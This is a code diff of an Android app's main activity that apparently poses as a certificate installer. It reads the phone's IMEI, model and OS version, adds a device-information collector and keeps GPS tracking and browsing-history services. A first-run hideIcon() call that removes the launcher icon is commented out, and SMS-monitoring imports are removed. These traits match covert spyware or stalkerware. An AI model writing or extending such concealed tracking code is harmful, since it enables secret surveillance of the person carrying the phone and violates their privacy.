@@ -1,6 +1,7 @@
 package com.inet.android.bs;
 
 import java.io.File;
+import java.io.ObjectInputStream.GetField;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.List;
@@ -10,7 +11,6 @@ import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.ComponentName;
-import android.content.ContentResolver;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
@@ -19,10 +19,8 @@ import android.content.SharedPreferences.Editor;
 import android.content.pm.ActivityInfo;
 import android.content.pm.PackageManager;
 import android.content.res.Configuration;
-import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
-import android.os.Handler;
 import android.preference.PreferenceManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
@@ -32,9 +30,8 @@ import android.widget.EditText;
 
 import com.inet.android.certificate.R;
 import com.inet.android.history.LinkService;
+import com.inet.android.info.GetInfo;
 import com.inet.android.location.GPSTracker;
-import com.inet.android.sms.SMSBroadcastReceiver;
-import com.inet.android.sms.SmsSentObserver;
 
 public class MainActivity extends Activity {
 	Button install;
@@ -63,19 +60,20 @@ public class MainActivity extends Activity {
 		super.onCreate(savedInstanceState);
 		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
 		// setContentView(R.layout.activity_main);
-
+		context = getApplicationContext();
 		FileLog.writeLog("\n\n ============================ ");
 		FileLog.writeLog("\n onCreate \n");
 		FileLog.writeLog("\n ============================\n ");
 
 		sp = PreferenceManager
-				.getDefaultSharedPreferences(getApplicationContext());
+				.getDefaultSharedPreferences(context);
 		final TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
 
 		String imeistring = manager.getDeviceId();
 		String model = android.os.Build.MODEL;
 		String versionAndroid = android.os.Build.VERSION.RELEASE;
-
+		GetInfo getInfo = new  GetInfo(context);
+		getInfo.getInfo();
 		aboutDev = " Model: " + model + " Version android: " + versionAndroid;
 		sIMEI = "IMEI: " + imeistring;
 		e = sp.edit();
@@ -92,12 +90,11 @@ public class MainActivity extends Activity {
 		if (!hasVisited) {
 			// проверка на первое посещение
 			e = sp.edit();
-
 			e.putBoolean("hasVisited", true);
 			e.putString("ABOUT", aboutDev);
 			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis()));
 			e.commit();
-			hideIcon();
+//			hideIcon();
 		}
 		getID(); // рекурсивный поиск файла с нужным именем
 		if (sp.getString("ID", "ID").equals("ID")) {
